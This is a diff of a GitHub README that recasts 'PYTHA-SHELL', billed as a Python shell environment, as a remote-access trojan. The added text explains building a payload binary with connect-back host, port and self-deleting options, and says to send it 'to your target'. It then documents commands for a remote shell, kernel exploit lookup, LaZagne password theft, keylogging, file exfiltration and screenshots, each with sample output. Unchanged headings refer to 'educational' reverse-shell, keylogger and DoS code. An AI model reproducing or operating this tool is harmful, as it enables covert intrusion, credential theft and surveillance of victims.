@@ -1,5 +1,6 @@
 
 # PYTHA-SHELL - Advanced Python Shell Environment
+![pyytha](https://github.com/user-attachments/assets/90ce266c-7eb4-4f6d-b71a-1a8c0a895b8f)
 
 **PYTHA-SHELL** is an advanced Python shell environment designed to provide a comprehensive and interactive experience for Python developers. It offers a rich set of features for executing code, debugging, and exploring Python scripts in a flexible and customizable interface.
 
@@ -42,10 +43,34 @@ pip install prompt_toolkit
 git clone https://github.com/Faizan-Khanx/PYTHA-SHELL.git
 cd PYTHA-SHELL
 pip install -r requirements.txt
-python PythaShell.py
+cd src
+python PythaShell.py -h
 ```
-- After This it will install Some External Pacakages . Wait for 2-3 minutes then press ```CTRL + C``` to stop the task
-- After Stopping run the following command Given Below in Launch The Shell
+
+Here's a table for the `PythaShell.py` options and their descriptions:
+
+| Option              | Command              | Description                           |
+|---------------------|----------------------|---------------------------------------|
+| `-h`, `--help`       | `PythaShell.py -h`   | Show this help message and exit       |
+| `-o`, `--host`       | `PythaShell.py -o`   | Host IP/hostname                      |
+| `-p`, `--port`       | `PythaShell.py -p`   | Port                                  |
+| `-i`, `--icon`       | `PythaShell.py -i`   | Path to icon file                     |
+| `-c`, `--console`    | `PythaShell.py -c`   | Run as a console application          |
+| `-d`, `--debug`      | `PythaShell.py -d`   | Enable PyInstaller debug mode         |
+| `-m`, `--melt`       | `PythaShell.py -m`   | Melt file on startup                  |
+
+## Setup Usage
+### Simple Usage
+- python3 PythaShell.py -o < host > -p < port > #Example python3 PythaShell.py -o 127.0.0.1 -p 1234
+
+    ![Screenshot_2024-09-18_08-12-15](https://github.com/user-attachments/assets/7c5847cb-4865-4549-a3c0-5331360a721e)
+  ![Screenshot_2024-09-18_08-15-49](https://github.com/user-attachments/assets/ad47afb3-c956-4358-bc03-bbf8bfcf4976)
+
+
+- Now Check The Dist Folder For The Binary. And Send The Binary To Your Target
+ ![Screenshot_2024-09-18_08-17-00](https://github.com/user-attachments/assets/55fa79b3-2ea4-45ea-ae4e-62de49eb4e77)
+- Here you can se the Payload with name main_client . Send this to your target . 
+
 ## Usage
 
 PYTHA-SHELL is a command-line tool for executing Python code and interacting with an advanced shell environment.
@@ -53,20 +78,272 @@ PYTHA-SHELL is a command-line tool for executing Python code and interacting wit
 ### Launch the Shell
 
 ```bash
-python PythaShell.py
+python main_server.py -p <port> ``` #On Same Port You Use While Making The Payload
 ```
 
-### Example Usage
+### Server Commands
 
-1. **Start PYTHA-SHELL**:
+| Command | Usage                              | Description                                |
+|---------|------------------------------------|--------------------------------------------|
+| `H`     | `H`                                | Help: Show available commands              |
+| `L`     | `L`                                | List all connections (inactive connections shown) |
+| `I`     | `I <index>`                        | Interact with a connection by index        |
+| `E`     | `E <index>`                        | Open a remote shell with the specified connection |
+| `S`     | `S <command>`                      | Send a command to every connection         |
+| `O`     | `O <hostname/IP> <port>`           | Change connection details (hostname/IP and port) |
+| `C`     | `C <index>`                        | Close the connection by index              |
+| `X`     | `X`                                | Close/clear all connections                |
+| `Q`     | `Q`                                | Close the server but keep the clients      |
+
+![Screenshot_2024-09-18_08-22-29](https://github.com/user-attachments/assets/e3d7bf83-d6be-4933-8fe7-80ca3ea55de9)
+- Now Execute L command to See The List of Total Hosts .
+- After This Execute I command #Example I 1 >> if you want to interact with host 1 .
+  
+   ![I](https://github.com/user-attachments/assets/95f7b4b9-763f-4b6e-96ee-7b308ed1f346)
+  
+## Interact Commands
+
+| Command | Usage                                     | Description                                              |
+|---------|-------------------------------------------|----------------------------------------------------------|
+| `H`     | `H`                                       | Help: Show available commands                            |
+| `E`     | `E`                                       | Open remote shell                                        |
+| `Y`     | `Y`                                       | Open Python interpreter                                  |
+| `V`     | `V`                                       | Find vulnerabilities (exploit-only mode)                 |
+| `R`     | `R`                                       | Retrieve passwords using LaZagne                         |
+| `K`     | `K <start/stop/dump>`                     | Keylogger: Start, stop, or dump keystrokes               |
+| `D`     | `D <directory/file>`                      | Download directory or file                               |
+| `U`     | `U`                                       | Upload a file                                            |
+| `S`     | `S`                                       | Take a screenshot                                        |
+| `I`     | `I`                                       | View information about the connection                    |
+| `B`     | `B`                                       | Move connection to the background                        |
+| `C`     | `C`                                       | Close the connection                                     |
+
+### Example Usage Of Interact Mode
+  Here’s the **Example Usage Of Interact Mode** with the commands you asked for, now with example usage:
+
+1. **Help**:
 
     ```bash
-    python PythaShell.py
+    >>> H
     ```
 
-    This command launches the interactive shell environment.
+    **Description**: This command displays a help menu showing all available commands in interact mode.
 
-2. **Execute Python Code**:
+2. **Open Remote Shell**:
+
+    ```bash
+    >>> E
+    ```
+
+    **Example**: Opens a shell to execute commands on the remote machine.
+
+    ```bash
+    >>> whoami
+    root
+    ```
+
+    **Description**: The command `E` opens the remote shell, where you can now run commands like `whoami` to check the user on the remote host.
+
+3. **Open Python Interpreter**:
+
+    ```bash
+    >>> Y
+    ```
+
+    **Example**: Opens a Python interpreter on the remote host.
+
+    ```python
+    >>> x = 5
+    >>> x * 2
+    10
+    ```
+
+    **Description**: You can now execute Python code directly on the remote system after running the `Y` command.
+
+4. **Find Vulnerabilities (Exploit Only)**:
+
+    ```bash
+    >>> V
+    ```
+
+    **Example**: Lists vulnerabilities available for exploitation.
+
+    ```bash
+    >>> V
+    [+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+   [+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+
+    ```
+
+    **Description**: This command scans the remote host and lists known vulnerabilities that have exploits available.
+
+5. **Retrieve Passwords using LaZagne**:
+
+    ```bash
+    >>> R
+    ```
+
+    **Example**: Retrieves passwords stored on the remote host.
+
+    ```bash
+    >>> R
+    [*] Password found: admin123
+    ```
+
+    **Description**: The `R` command runs the LaZagne tool on the remote host to recover stored credentials.
+
+6. **Keylogger Commands**:
+
+    - **Start Keylogger**:
+
+      ```bash
+      >>> K start
+      ```
+
+      **Example**: Starts the keylogger on the remote system.
+
+      ```bash
+      >>> K start
+      [*] Keylogger started
+      ```
+
+    - **Stop Keylogger**:
+
+      ```bash
+      >>> K stop
+      ```
+
+      **Example**: Stops the keylogger.
+
+      ```bash
+      >>> K stop
+      [*] Keylogger stopped
+      ```
+
+    - **Dump Keylogger**:
+
+      ```bash
+      >>> K dump
+      ```
+
+      **Example**: Dumps the logged keystrokes to a file.
+
+      ```bash
+      >>> K dump
+      [*] Dumping keystrokes:
+      password123
+      ```
+
+7. **Download Directory or File**:
+
+    - **Download Directory**:
+
+      ```bash
+      >>> D /home/user/documents
+      ```
+
+      **Example**: Downloads the `/documents` directory from the remote system.
+
+      ```bash
+      >>> D /home/user/documents
+      [*] Downloading directory /documents...
+      ```
+
+    - **Download File**:
+
+      ```bash
+      >>> D /home/user/file.txt
+      ```
+
+      **Example**: Downloads the file `file.txt`.
+
+      ```bash
+      >>> D /home/user/file.txt
+      [*] Downloading file /file.txt...
+      ```
+
+8. **Upload File**:
+
+    ```bash
+    >>> U /path/to/local/file.txt
+    ```
+
+    **Example**: Uploads a file from your local machine to the remote system.
+
+    ```bash
+    >>> U /path/to/local/file.txt
+    [*] Uploading file.txt to remote host...
+    ```
+
+9. **Take Screenshot**:
+
+    ```bash
+    >>> S
+    ```
+
+    **Example**: Takes a screenshot of the remote system.
+
+    ```bash
+    >>> S
+    [*] Screenshot saved as screenshot.png
+    ```
+
+10. **View Information**:
+
+    ```bash
+    >>> I
+    ```
+
+    **Example**: Retrieves system information such as OS, memory, and CPU usage.
+
+    ```bash
+    >>> I
+    [*] OS: Ubuntu 20.04
+    [*] CPU: 4 cores
+    [*] Memory: 8GB
+    ```
+
+11. **Move Connection to Background**:
+
+    ```bash
+    >>> B
+    ```
+
+    **Example**: Moves the active connection to the background, freeing up the interface.
+
+    ```bash
+    >>> B
+    [*] Connection moved to background.
+    ```
+
+12. **Close Connection**:
+
+    ```bash
+    >>> C
+    ```
+
+    **Example**: Closes the current connection with the remote host.
+
+    ```bash
+    >>> C
+    [*] Connection closed.
+    ```
+
+13. **Execute Python Code**:
 
     ```python
     >>> print("Hello, World!")
@@ -75,7 +352,7 @@ python PythaShell.py
 
     This command executes the Python code and prints the result.
 
-3. **Run a Python Script**:
+14. **Run a Python Script**:
 
     ```python
     >>> run('example_script.py')
@@ -83,7 +360,7 @@ python PythaShell.py
 
     This command loads and runs the Python script `example_script.py`.
 
-4. **Inspect a Variable**:
+15. **Inspect a Variable**:
 
     ```python
     >>> x = 10
@@ -93,7 +370,7 @@ python PythaShell.py
 
     This command assigns the value `10` to variable `x` and prints its value.
 
-5. **Set Breakpoints**:
+16. **Set Breakpoints**:
 
     ```python
     >>> set_breakpoint()
@@ -101,7 +378,7 @@ python PythaShell.py
 
     This command sets a breakpoint in the code for debugging.
 
-6. **Inspect Variables**:
+17. **Inspect Variables**:
 
     ```python
     >>> inspect_variable('x')
@@ -109,7 +386,7 @@ python PythaShell.py
 
     This command inspects the variable `x` and shows its current value.
 
-7. **Use Autocompletion**:
+18. **Use Autocompletion**:
 
     ```python
     >>> import math
@@ -118,7 +395,7 @@ python PythaShell.py
 
     Typing `math.` and using autocompletion will show available attributes like `pi`.
 
-8. **Customizable Interface**:
+19. **Customizable Interface**:
 
     ```python
     >>> customize_interface(theme='dark')
@@ -126,7 +403,7 @@ python PythaShell.py
 
     This command changes the shell interface to a dark theme.
 
-9. **Educational Example - Reverse Shell Code**:
+20. **Educational Example - Reverse Shell Code**:
 
     ```python
     >>> # For educational purposes only. Be cautious and use responsibly.
@@ -150,7 +427,7 @@ python PythaShell.py
 
     **Description**: This code demonstrates a basic reverse shell, where the target machine connects back to an attacker's machine and executes commands received over the network. **Warning**: This is for educational purposes only. **Do not use this code maliciously** or without proper authorization. It’s meant to demonstrate how reverse shells work for learning and ethical hacking practice.
 
-10. **Educational Example - Malicious File Download**:
+21. **Educational Example - Malicious File Download**:
 
     ```python
     >>> # For educational purposes only. Use responsibly.
@@ -162,7 +439,7 @@ python PythaShell.py
 
     **Description**: This code snippet shows how to download a file from a given URL. In a malicious context, this could be used to download harmful files. **Do not use this code for malicious purposes**. It is included here for educational purposes to understand how such scripts operate.
 
-11. **Educational Example - Keylogger Code**:
+22. **Educational Example - Keylogger Code**:
 
     ```python
     >>> # For educational purposes only. Be cautious with such code.
@@ -182,7 +459,7 @@ python PythaShell.py
 
     **Description**: This code demonstrates a simple keylogger that records keystrokes to a file. **Warning**: This is for educational purposes only. **Do not use this code to infringe on others' privacy**. It’s meant to illustrate how keyloggers function for learning and ethical hacking practice.
 
-12. **Educational Example - SQL Injection Simulation**:
+23. **Educational Example - SQL Injection Simulation**:
 
     ```python
     >>> # For educational purposes only. Use responsibly.
@@ -202,7 +479,7 @@ python PythaShell.py
 
     **Description**: This code demonstrates a simple SQL injection simulation by manipulating a query string to bypass authentication. **Warning**: This is for educational purposes only. **Do not use this code to attack or compromise databases**. It’s meant to illustrate how SQL injection works for learning and ethical hacking practice.
 
-13. **Educational Example - Buffer Overflow Simulation**:
+24. **Educational Example - Buffer Overflow Simulation**:
 
     ```python
     >>> # For educational purposes only. Use responsibly.
@@ -218,7 +495,7 @@ python PythaShell.py
 
     **Description**: This code demonstrates a buffer overflow by writing more data to a buffer than it can handle, potentially causing unexpected behavior. **Warning**: This is for educational purposes only. **Do not use this code to exploit vulnerabilities**. It’s meant to illustrate how buffer overflows work for learning and ethical hacking practice.
 
-14. **Educational Example - Denial of Service (DoS) Simulation**:
+25. **Educational Example - Denial of Service (DoS) Simulation**:
 
     ```python
     >>> # For educational purposes only. Use responsibly.
@@ -235,7 +512,7 @@ python PythaShell.py
 
     **Description**: This code demonstrates a simple denial of service (DoS) attack by flooding a target with a large number of messages. **Warning**: This is for educational purposes only. **Do not use this code to disrupt services**. It’s meant to illustrate how DoS attacks work for learning and ethical hacking practice.
 
-15. **Educational Example - Remote Code Execution Simulation**:
+26. **Educational Example - Remote Code Execution Simulation**:
 
     ```python
     >>> # For educational purposes only. Use responsibly.
@@ -263,22 +540,24 @@ python PythaShell.py
     **Description**: This code demonstrates a remote code execution (RCE) simulation where the server listens for incoming connections and executes commands received from a client. **Warning**: This is for educational purposes only. **Do not use this code to exploit systems**. It’s meant to illustrate how remote code execution works for learning and ethical hacking practice.
 
 
-### Commands
-
-| Name                    | Command                        | Description                                            |
-|-------------------------|--------------------------------|--------------------------------------------------------|
-| **Execute Code**        | `python_code`                   | Run a line of Python code.                            |
-| **Run Script**          | `run <script.py>`               | Execute the specified Python script.                  |
-| **Set Breakpoint**      | `set_breakpoint()`              | Set a breakpoint for debugging.                        |
-| **Inspect Variable**    | `inspect_variable(<var>)`       | Show the value of the specified variable.             |
-| **Autocompletion**      | `python_code` with autocompletion | Enable code autocompletion for the line of code.      |
-| **Customize Interface** | `customize_interface(<options>)` | Change the appearance of the shell interface.        |
-
 ## Screenshots
 
-### PYTHA-SHELL Interface
+![V](https://github.com/user-attachments/assets/af75d24c-f188-471e-9ef0-63ac360f1452)
+     
+ *Example ScreenShott Of ```V``` Command Which Shows System Vulnerability To Exploit*
 
-![PYTHA-SHELL Interface](https://example.com/screenshots/pytha_shell.png)
+ ![R](https://github.com/user-attachments/assets/9b4f9068-51cd-46eb-9b00-59806d232c68)
+     
+*Example ScreenShott Of ```R``` Command Which Retreive All The Passwords*
+ 
+![Y](https://github.com/user-attachments/assets/1ba3e472-0e2e-4952-b498-4a52552181c9)
+     
+ *Example ScreenShott Of ```Y``` Command Which Open Python Interpreter,we can also inject Malicious Code*
+ 
+ ![I](https://github.com/user-attachments/assets/b4dc581e-230d-4da8-adde-b3d6e4bb7c6b)
+      
+*Example ScreenShott Of ```I``` Command Which Shows System Information*
+
 
 ## License
 
